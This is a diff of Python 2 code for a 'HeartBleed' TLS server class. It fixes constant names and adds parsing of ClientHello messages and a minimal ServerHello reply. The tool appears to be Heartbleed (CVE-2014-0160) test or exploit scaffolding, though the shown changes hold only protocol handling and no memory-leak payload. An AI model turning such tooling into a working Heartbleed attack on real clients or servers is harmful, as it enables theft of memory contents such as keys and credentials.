@@ -32,18 +32,24 @@ class TLS(Logging):
 			https://tools.ietf.org/html/rfc6520
 	"""
 	HEADER_LEN = 5
-	HANDSHARK  = 22
+	ALERT      = 21
+	HANDSHAKE  = 22
 	HEARTBEAT  = 24
+	CMD = {"21": "ALERT", "22": "HANDSHAKE", "24": "HEARTBEAT"}
 
 	def TLSDecode(self, buf, type=None):
+		""" TLS Header Decode """
 		if not type:
+			## CMD: 1 / Version: 2 / Length: 2
 			return struct.unpack(">BHH", buf[0:5])
-		elif 22 == type:
+		elif self.HANDSHAKE == type:
+			## Handshake Type: 1 / Length: 3
 			type    = struct.unpack(">B", buf[0])
 			length  = struct.unpack(">i", "\x00" + buf[1:4])
 			payload = buf[4:]
 			return type, length, payload
-		elif 24 == type:
+		elif self.HEARTBEAT == type:
+			## Heartbeat Type: 1 / Length: 1
 			return struct.unpack('>BH{0}s'.format(len(buf)-3), buf)
 	def TLSRecord(self, type, version, payload, length=None):
 		""" General format for all TLS records """
@@ -119,6 +125,39 @@ class HeartBleed(TLS):
 				data += buf
 				remain_len -= len(buf)
 		return data
+	def handleHandshake(self, cli, payload):
+		def ServerHello(ver, random, sessionID):
+			reply  = ""
+			reply += struct.pack(">H", ver)
+			reply += struct.pack(">32s", random)
+			reply += struct.pack(">B", sessionID)
+			reply += "\xc0\x13"	## Cipher
+			reply += "\x00"		## Compression Methods
+			reply += "\x00\x00"	## Number Extension
+			return reply
+		while payload:
+			## Handle HandShake payload
+			##	MSG Type: 1 / Length: 3
+			type, payload = struct.unpack(">B", payload[0]), payload[1:]
+			length, payload = struct.unpack(">I", "\x00" + payload[:3]), payload[3:]
+
+			if 1 == type[0]: ## ClientHello
+				ver, random, session = struct.unpack(">H32sB", payload[:35])
+				payload = payload[35:]
+
+				cipherLen	= struct.unpack(">H", payload[:2])[0]
+				payload		= payload[2:]
+				cipher, payload = payload[:cipherLen/2], payload[cipherLen/2:]
+
+				extensionLen= struct.unpack(">H", payload[:2])[0]
+				payload 	= payload[2:]
+				extension, payload = payload[:extensionLen], payload[extensionLen:]
+
+				reply = ServerHello(ver, random, session)
+				cli.send(self.TLSHandshake(2, reply))
+			else:
+				print "Cannot handle Handshake type: %s %s" %(type, length)
+				raise NotImplementedError
 	def handle(self, cli, addr):
 		""" Handle TLS communication """
 		while True:
@@ -127,9 +166,10 @@ class HeartBleed(TLS):
 			if not buf: raise SystemError("Not receive any package")
 			type, version, length = self.TLSDecode(buf)
 			payload = self.recv(cli, length)
-			self.dumpPackage("TSL [%s]" %type, buf + payload)
+			self.dumpPackage("TSL [%s]" %self.CMD[str(type)], buf + payload)
 
-			if type == self.HANDSHARK:
+			if type == self.HANDSHAKE:
+				self.handleHandshake(cli, payload)
 				data = self.TLSHandshake(14, "End Handshake")
 				cli.send(data)
 			elif type == self.HEARTBEAT:
